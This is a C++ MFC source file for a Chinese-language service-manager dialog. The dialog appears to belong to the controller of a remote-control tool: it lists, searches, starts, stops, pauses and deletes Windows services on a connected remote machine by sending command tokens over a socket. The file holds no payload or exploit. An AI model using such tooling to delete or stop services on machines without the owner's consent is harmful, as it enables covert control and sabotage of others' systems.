// ServiceDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "ServiceDlg.h"
#include "ServiceInfoDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define ID_STATUS_SEARCH 41027
#define ID_STATUS_TYPE   41028

#define WM_SHOW_MSG (WM_USER+103)
/////////////////////////////////////////////////////////////////////////////
// CServiceDlg dialog
static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
};

CServiceDlg::CServiceDlg(CWnd* pParent , CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CServiceDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CServiceDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	
	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICONSERVICE), IMAGE_ICON, 20, 20, 0);
	
	nServiceType = 0;

}


void CServiceDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CServiceDlg)
	DDX_Control(pDX, IDC_LIST, m_list);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CServiceDlg, CDialog)
	//{{AFX_MSG_MAP(CServiceDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST, OnRclickList)
	ON_COMMAND(ID_MENUITEM_REFRESH_SERVICE, OnMenuitemRefreshService)
	ON_COMMAND(ID_MENUITEM_DEL_SERVICE, OnMenuitemDelService)
	ON_COMMAND(ID_MENUITEM_START_SERVICE, OnMenuitemStartService)
	ON_COMMAND(ID_MENUITEM_STOP_SERVICE, OnMenuitemStopService)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST, OnDblclkList)
	ON_COMMAND(ID_MENUITEM_PROPERTIES_SERVICE, OnMenuitemPropertiesService)
	ON_COMMAND(ID_MENUITEM_PAUSE_SERVICE, OnMenuitemPauseService)
	ON_COMMAND(ID_MENUITEM_REGAIN_SERVICE, OnMenuitemRegainService)
	ON_COMMAND(ID_MENUITEM_REBOOT_SERVICE, OnMenuitemRebootService)
	//}}AFX_MSG_MAP
	ON_CBN_SELCHANGE(ID_STATUS_TYPE, OnSelchangeComboServiceType)
	ON_MESSAGE(WM_SHOW_MSG,OnShowMessage)

END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServiceDlg message handlers
void CServiceDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);

	CDialog::OnClose();
}

BOOL CServiceDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("服务管理 \\\\%s", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	// 最大化
//	ShowWindow( SW_SHOWMAXIMIZED ); 


	m_list.SetExtendedStyle(/*LVS_EX_FLATSB |*/ LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "显示名称", LVCFMT_LEFT, 150);
	m_list.InsertColumn(1, "描述", LVCFMT_LEFT, 70);
	m_list.InsertColumn(2, "状态", LVCFMT_LEFT, 70);
	m_list.InsertColumn(3, "启动类型", LVCFMT_LEFT, 60);
	m_list.InsertColumn(4, "登陆身份", LVCFMT_LEFT, 100);
	m_list.InsertColumn(5, "桌面交互", LVCFMT_LEFT, 60);
	m_list.InsertColumn(6, "服务名", LVCFMT_LEFT, 100);
	m_list.InsertColumn(7, "可执行文件路径", LVCFMT_LEFT, 250);

	m_ImgList.Create(16, 16, ILC_COLOR32|ILC_MASK, 10, 0);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICONSERVICE));
	m_list.SetImageList(&m_ImgList,LVSIL_SMALL);


	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 130);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(4, m_wndStatusBar.GetItemID(4), SBPS_NORMAL, 130);

	m_wndStatusBar.SetPaneText(1,"搜索:");
	m_wndStatusBar.SetPaneText(3,"选择服务类型");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	

	RECT	rect;
	m_wndStatusBar.GetItemRect(2, &rect);
	m_wndComBox_search = new CXTPComboBox;
	m_wndComBox_search->CreateEx(NULL, _T("ComboBox"), NULL,WS_CHILD|WS_VISIBLE|WS_VSCROLL|CBS_DROPDOWN|WS_TABSTOP, rect, &m_wndStatusBar, ID_STATUS_SEARCH);
	m_wndComBox_search->SetFont(m_wndStatusBar.GetFont());
	m_wndComBox_search->AddString("program files");
	m_wndComBox_search->SetCurSel(0);


	m_wndStatusBar.GetItemRect(4, &rect);
	m_wndComBox_type = new CXTPComboBox;
	m_wndComBox_type->CreateEx(NULL, _T("ComboBox"), NULL,WS_CHILD|WS_VISIBLE|WS_VSCROLL|CBS_DROPDOWNLIST|WS_TABSTOP, rect, &m_wndStatusBar, ID_STATUS_TYPE);
	
	m_wndComBox_type->SetFont(m_wndStatusBar.GetFont());
	m_wndComBox_type->AddString("WIN32服务");
	m_wndComBox_type->AddString("驱动服务");
	m_wndComBox_type->SetCurSel(0);



	HWND hWndHeader = m_list.GetDlgItem(0)->GetSafeHwnd();
	m_heades.SubclassWindow(hWndHeader);
	
	m_heades.SetTheme(new CXTHeaderCtrlThemeOfficeXP());
	


	AdjustList();
	ShowServiceList();
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CServiceDlg::OnReceiveComplete()
{
	
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SERVICE_LIST:
		ShowServiceList();
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

void CServiceDlg::OnSelchangeComboServiceType() 
{
	UpdateData(TRUE);

	if (nServiceType == m_wndComBox_type->GetCurSel())
		return;
 	nServiceType = m_wndComBox_type->GetCurSel();

	BYTE bToken;
	if (!nServiceType)
		bToken = SERVICE_WIN32;
	else
		bToken = SERVICE_KERNEL_DRIVER;
	
	m_iocpServer->Send(m_pContext,&bToken,sizeof(BYTE));
}

void CServiceDlg::ShowServiceList()
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*DisplayName;
	char    *Describe;
	char	*serRunway;
	char	*serauto;
	char    *Login;
	char    *InterActive;
	char	*ServiceName;
	char	*serfile;

	DWORD	dwOffset = 0;
	m_list.DeleteAllItems();
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		DisplayName = lpBuffer + dwOffset;
		Describe = DisplayName + lstrlen(DisplayName) +1;
		serRunway = Describe + lstrlen(Describe) + 1;
		serauto = serRunway + lstrlen(serRunway) + 1;
		Login = serauto + lstrlen(serauto) +1;
		InterActive = Login + lstrlen(Login) + 1;
		ServiceName = InterActive + lstrlen(InterActive) +1;
		serfile = ServiceName + lstrlen(ServiceName) + 1; 
		
		m_list.InsertItem(i, DisplayName,0);
		m_list.SetItemText(i, 1, Describe);
		m_list.SetItemText(i, 2, serRunway);		
		m_list.SetItemText(i, 3, serauto);
		m_list.SetItemText(i, 4, Login );
		m_list.SetItemText(i, 5, InterActive );
		m_list.SetItemText(i, 6, ServiceName );
		m_list.SetItemText(i, 7, serfile );

		dwOffset += lstrlen(DisplayName) + lstrlen(Describe) + lstrlen(serRunway) + lstrlen(serauto) + lstrlen(Login) + lstrlen(InterActive) + lstrlen(ServiceName) + lstrlen(serfile)  + 8;
	}

	strMsgShow.Format("共 %d 个服务",i);
	PostMessage(WM_SHOW_MSG,0,0);
}
// 显示消息
void CServiceDlg::OnShowMessage(WPARAM wParam, LPARAM lParam)
{
    m_wndStatusBar.SetPaneText(0, strMsgShow); 
}

void CServiceDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (IsWindowVisible())
		AdjustList();

	// 状态栏还没有创建
	if (m_wndStatusBar.m_hWnd == NULL)
		return;
	
	// 定位状态栏
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示工具栏
	
	RECT	rect;
	m_wndStatusBar.GetItemRect(2, &rect);
	m_wndComBox_search->MoveWindow(&rect);
	
	m_wndStatusBar.GetItemRect(4, &rect);
	m_wndComBox_type->MoveWindow(&rect);
}

void CServiceDlg::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom - 20;
	
	m_list.MoveWindow(&rectList);
}

BOOL CServiceDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class

	if(::GetDlgCtrlID(::GetParent(pMsg->hwnd)) == ID_STATUS_SEARCH )
	{
		UpdateData( TRUE );
		
		if( pMsg-> message == WM_KEYDOWN && pMsg->wParam == VK_RETURN ) 
		{    
			UpdateData(TRUE);
			// 获取搜索关键词
			CString str;
 			m_wndComBox_search->GetWindowText(str);
			if(str.IsEmpty())
				return TRUE;

			// 关键词插入combox
			m_wndComBox_search->InsertString(0, str);
        	m_wndComBox_search->SetCurSel(0);


			// 复位上次搜索 设置有*号标志的取消  全部未选中
			CString Data;
			int nCut = m_list.GetItemCount();
			for (int i=0; i < nCut; i++)
			{
				m_list.SetItemState(i, 0, LVIS_SELECTED);
				m_list.SetCheck(i,FALSE);
				
				
				Data = 	m_list.GetItemText(i, 6);
				int n = Data.Find('*');
				if (n == 0)
				{
					Data = Data.Right(Data.GetLength() - 1);
					m_list.SetItemText(i, 6, Data);
				}else
					continue;
			}

			int nSearch = 0 ;
			// 开始搜索
			for(int n = 0; n < nCut;n++)
			{
				// 复位行数据
				Data = "";
				// 得到行数据
				for(int i = 0; i < m_list.GetHeaderCtrl()->GetItemCount(); i++)
				{
					Data += m_list.GetItemText(n, i);
				}

				// 如果找到
				if(Data.Find(str,0)!= -1)
				{
					// 服务名前加 * 号
					CString strTemp,strFind;
					strFind = m_list.GetItemText(n,6);
					int s = strFind.Find("*");
					if (s == 0)
					{
						strFind = strFind.Right(strFind.GetLength() - 1);
					}
					strTemp = "*";
					strTemp += strFind;
					
					// 	设置新服务名
					m_list.SetItemText(n,6,strTemp);

					// 获取list 焦点 设置行选中
					m_list.SetFocus();
					m_list.SetItemState(n, LVIS_SELECTED, LVIS_SELECTED);
					m_list.SetCheck(n,TRUE);

					nSearch++;
				}
			}
			strMsgShow.Format("找到 %d 个符合条件的服务",nSearch);
			PostMessage(WM_SHOW_MSG,0,0);

			return TRUE ;
		}
	}

	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CServiceDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_SERVICE);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}


void CServiceDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if (m_wndComBox_search)
		delete m_wndComBox_search;
	if (m_wndComBox_type)
		delete m_wndComBox_type;

	delete this;
	CDialog::PostNcDestroy();
}

void CServiceDlg::OnMenuitemRefreshService() 
{
	// TODO: Add your command handler code here
	BYTE bToken;
	if (!nServiceType)
		bToken = SERVICE_WIN32;
	else
		bToken = SERVICE_KERNEL_DRIVER;
	m_iocpServer->Send(m_pContext,&bToken,sizeof(BYTE));
}

void CServiceDlg::OnMenuitemDelService() 
{
	// TODO: Add your command handler code here
	SendToken(COMMAND_DELETESERVERICE);
}

void CServiceDlg::OnMenuitemStartService() 
{
	// TODO: Add your command handler code here
	SendToken(COMMAND_STARTSERVERICE);
}

void CServiceDlg::OnMenuitemStopService() 
{
	// TODO: Add your command handler code here
	SendToken(COMMAND_STOPSERVERICE);
}

void CServiceDlg::SendToken(BYTE bToken)
{
	CString		tSerName;
	
	int		nItem = m_list.GetNextItem(-1,LVNI_SELECTED);
	tSerName = m_list.GetItemText(nItem,6);
	
	int s = tSerName.Find("*");
	if (s == 0)
	{
		tSerName = tSerName.Right(tSerName.GetLength() - 1);
	}
	
	int nPacketLength = (tSerName.GetLength() + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = bToken;
	
	memcpy(lpBuffer + 1, tSerName.GetBuffer(0), tSerName.GetLength());
	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength, TRUE);
	LocalFree(lpBuffer);
}


void CServiceDlg::OpenInfoDlg()
{
	int   nItem=-1;  
	nItem   =   m_list.GetNextItem(nItem,  LVNI_SELECTED);  
	if(nItem==-1)   
		return; 

	CServiceInfoDlg pDlg(this);

	pDlg.m_iocpServer = m_iocpServer;
	pDlg.m_pContext = m_pContext;

 	pDlg.m_ServiceInfo.strSerName = m_list.GetItemText(nItem,   6);  
 	pDlg.m_ServiceInfo.strSerDisPlayname =  m_list.GetItemText(nItem,   0);
 	pDlg.m_ServiceInfo.strSerDescription = m_list.GetItemText(nItem,   1);
 	pDlg.m_ServiceInfo.strFilePath = m_list.GetItemText(nItem,   7);
	pDlg.m_ServiceInfo.strSerRunway = m_list.GetItemText(nItem,   3);
 	pDlg.m_ServiceInfo.strSerState = m_list.GetItemText(nItem,   2);

	pDlg.DoModal();

}

void CServiceDlg::OnDblclkList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	OpenInfoDlg();
	*pResult = 0;
}

void CServiceDlg::OnMenuitemPropertiesService() 
{
	// TODO: Add your command handler code here
	OpenInfoDlg();
}

void CServiceDlg::OnMenuitemPauseService() 
{
	// TODO: Add your command handler code here
	SendToken(COMMAND_PAUSESERVERICE);
}

void CServiceDlg::OnMenuitemRegainService() 
{
	// TODO: Add your command handler code here
	SendToken(COMMAND_CONTINUESERVERICE);
}
void CServiceDlg::OnMenuitemRebootService() 
{
	// TODO: Add your command handler code here
	SendToken(COMMAND_STOPSERVERICE);
	Sleep(100);
	SendToken(COMMAND_STARTSERVERICE);
}
